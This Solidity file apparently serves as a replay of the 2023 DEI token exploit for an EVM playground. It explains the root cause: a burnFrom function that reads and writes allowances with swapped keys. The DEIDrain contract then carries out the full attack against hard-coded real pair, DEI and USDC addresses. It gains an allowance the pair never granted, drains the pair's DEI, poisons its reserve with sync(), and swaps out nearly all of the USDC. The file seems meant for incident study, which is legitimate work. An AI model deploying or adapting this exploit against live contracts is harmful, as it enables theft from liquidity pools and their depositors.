// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-05-DEI).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// `DEIPocTest` (test/DEI_exp.sol) — `address(this)` is the attacker, and there is
// no flash loan / callback, just a flat sequence of calls. There is no standalone
// exploit contract to deploy, so for the playground this is a faithful,
// self-contained copy of `testExploit()`'s body, moved into `run()`. Logic and
// constants are copied verbatim (no imports, minimal inline interfaces).
//
// Root cause — confirmed against the FETCHED source of the delegatecall target
// 0xBC1b62dB243B51dabCd9540473324f36E094EC55 (LERC20Upgradable.burnFrom):
//
//   function burnFrom(address account, uint256 amount) public virtual {
//       uint256 currentAllowance = _allowances[_msgSender()][account];   // BUG: keys swapped
//       _approve(account, _msgSender(), currentAllowance - amount);      // writes to the OTHER mapping slot
//       _burn(account, amount);
//   }
//
// A correct `burnFrom` reads/decrements `_allowances[account][msg.sender]` (how
// much `account` approved the caller to spend) and burns from `account`. This
// version instead READS `_allowances[msg.sender][account]` — the CALLER's own
// outbound approval TOWARD `account` — and WRITES that value into
// `_allowances[account][msg.sender]`, i.e. it mirrors the caller's own approval
// back as an allowance FROM the target TO the caller. So:
//   1. The attacker first calls `DEI.approve(pair, MAX)` — an entirely ordinary,
//      self-directed approval (`_allowances[attacker][pair] = MAX`).
//   2. `DEI.burnFrom(pair, 0)` reads `_allowances[attacker][pair]` (= MAX from
//      step 1) as `currentAllowance`, computes `MAX - 0 = MAX`, and writes
//      `_allowances[pair][attacker] = MAX` — an allowance the pair never
//      granted, mirrored straight from the attacker's own unrelated approval.
// The attacker then drains the pair's DEI via `transferFrom`, forces the pair to
// `sync()` its now-empty DEI balance into `reserve0`, sends the DEI back in
// (inflating the real balance far above the now-stale 1-wei reserve), and calls
// `swap()` — whose `k()` check is computed against the STALE synced reserve and
// trivially passes, letting the attacker walk off with the pair's entire USDC
// side.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IDEI is IERC20 {
    function burnFrom(address account, uint256 amount) external;
}

interface IStablePair {
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract DEIDrain {
    IStablePair pair = IStablePair(0x7DC406b9B904a52D10E19E848521BbA2dE74888b);
    IDEI DEI = IDEI(0xDE1E704dae0B4051e80DAbB26ab6ad6c12262DA0);
    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);

    function run() external {
        // Step 1 — LOAD-BEARING, not setup noise: this ordinary, self-directed
        // approval sets _allowances[address(this)][pair] = MAX. burnFrom() below
        // reads exactly this slot (with the keys swapped) and mirrors it back.
        DEI.approve(address(pair), type(uint256).max);

        // THE BUG: burnFrom(pair, 0) reads _allowances[msg.sender][pair] (== MAX,
        // from step 1) and writes it to _allowances[pair][msg.sender] — granting
        // the caller an allowance the pair itself never approved.
        DEI.burnFrom(address(pair), 0);

        // Drain the pair's entire DEI balance (leave 1 wei) using the spurious
        // allowance the buggy burnFrom just granted.
        DEI.transferFrom(address(pair), address(this), DEI.balanceOf(address(pair)) - 1);

        // Force the pair to commit its now-drained (1 wei) DEI balance as the new
        // recorded reserve0 — poisoning the AMM's invariant baseline.
        pair.sync();

        // Return the drained DEI to the pair (real balance ~4.6M again), then swap
        // it back for USDC. swap()'s k-check is computed against the STALE 1-wei
        // reserve0 recorded by sync(), so it trivially passes even though the
        // payout empties almost the entire USDC side.
        DEI.transfer(address(pair), DEI.balanceOf(address(this)));
        pair.swap(0, 5_047_470_472_572, address(this), "");
    }
}
